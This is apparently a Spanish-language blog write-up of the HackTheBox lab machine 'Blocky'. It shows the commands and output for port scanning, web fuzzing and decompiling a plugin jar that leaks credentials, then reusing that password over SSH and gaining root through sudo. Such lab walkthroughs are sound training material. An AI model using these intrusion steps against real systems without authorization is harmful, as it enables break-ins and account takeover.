---
title: HTB - Blocky
published: true
categories: [Linux]
tags: [eJPT, Fácil]
---


<img src="/assets/HTB/Blocky/blocky.png">


¡Hola!
Vamos a resolver de la máquina `Blocky` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Wordpress Enumeration**
- **Information Leakage**
- **Analyzing a jar file - JD-Gui + SSH Access**
- **Abusing Sudoers Privilege [Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Blocky`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.37
PING 10.10.10.37 (10.10.10.37) 56(84) bytes of data.
64 bytes from 10.10.10.37: icmp_seq=1 ttl=63 time=42.3 ms

--- 10.10.10.37 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.37 -oG allPorts

PORT      STATE SERVICE   REASON
21/tcp    open  ftp       syn-ack ttl 63
22/tcp    open  ssh       syn-ack ttl 63
80/tcp    open  http      syn-ack ttl 63
25565/tcp open  minecraft syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p21,22,80,25565 10.10.10.37 -oN targeted

PORT      STATE SERVICE   VERSION
21/tcp    open  ftp?
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Añadimos `blocky.htb` a nuestro `/etc/hosts`

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://blocky.htb
http://blocky.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.22.41], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[BlockyCraft &8211; Under Construction!], UncommonHeaders[link], WordPress[4.8]
```

Visitamos la página en cuestión y vemos un Wordpress del que podemos extraer un posible usuario válido **notch** en la publicación de un post


<img src="/assets/HTB/Blocky/web.png">


Seguimos fuzzeando para encontrar posibles rutas de directorios, pare ello utilizaremos el diccionario `common.txt`

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/common.txt "http://blocky.htb/FUZZ"

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://blocky.htb/FUZZ
Total requests: 4713

=====================================================================
ID           Response   Lines    Word       Chars       Payload                       
=====================================================================

000000024:   403        11 L     32 W       294 Ch      ".htaccess"                   
000000023:   403        11 L     32 W       289 Ch      ".hta"                        
000000025:   403        11 L     32 W       294 Ch      ".htpasswd"                   
000002317:   301        9 L      28 W       313 Ch      "javascript"                  
000003105:   301        9 L      28 W       313 Ch      "phpmyadmin"                  
000003151:   301        9 L      28 W       310 Ch      "plugins"                     
000003710:   403        11 L     32 W       298 Ch      "server-status"               
000004581:   301        9 L      28 W       314 Ch      "wp-includes"                 
000004568:   301        9 L      28 W       311 Ch      "wp-admin"                    
000004575:   301        9 L      28 W       313 Ch      "wp-content"                  
000004540:   301        9 L      28 W       307 Ch      "wiki"                        
000004647:   405        0 L      6 W        42 Ch       "xmlrpc.php"                  
```

Vemos directorios típicos de una estructura de Wordpress. Dentro de plugins nos econtramos dos archivos java


<img src="/assets/HTB/Blocky/plugins.png">


El archivo `griefprevention` es un plugin open source que está disponible de manera libre, sin embargo `BlockyCore` parece ser un archivo creado por el administrador del server. Lo decompilamos con `JD-GUI` y encontramos credenciales de root para MySQL


<img src="/assets/HTB/Blocky/pass.png">


Siempre hay que tratar de comprobar la posibilidad de que se haya reutilizado la contraseña por lo que procedemos a probarla con el usuario que identificamos en el post de Wordpress

```bash
❯ ssh notch@10.10.10.37
notch@10.10.10.37 s password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Tue Nov  8 10:39:12 2022 from 10.10.14.19
notch@Blocky:~$ 
```
### Escalada Privilegios

* * *

Iniciamos la enumeración de grupos del usuario `notch`

```bash
notch@Blocky:~$ id 
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Estamos en el grupo `sudo` y tenemos la password de notch

```bash
notch@Blocky:~$ sudo su                
[sudo] password for notch: 
root@Blocky:/home/notch# whoami
root
```

### Flags

* * *

Tras una búsqueda desde la raíz localizamos las flags en sus respectivos directorios. Con el comando `cat` nos muestra el contenido.

```bash
#USER
find / -name user.txt
/home/notch/user.txt
cat /home/notch/user.txt
670df27f532776c47***************
```

```bash
#ROOT
find / -name root.txt
/root/root.txt
cat /root/root.txt
0a585d77c9697cb72***************
```

Hemos completado la máquina **Blocky** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Blocky/pwned.png">
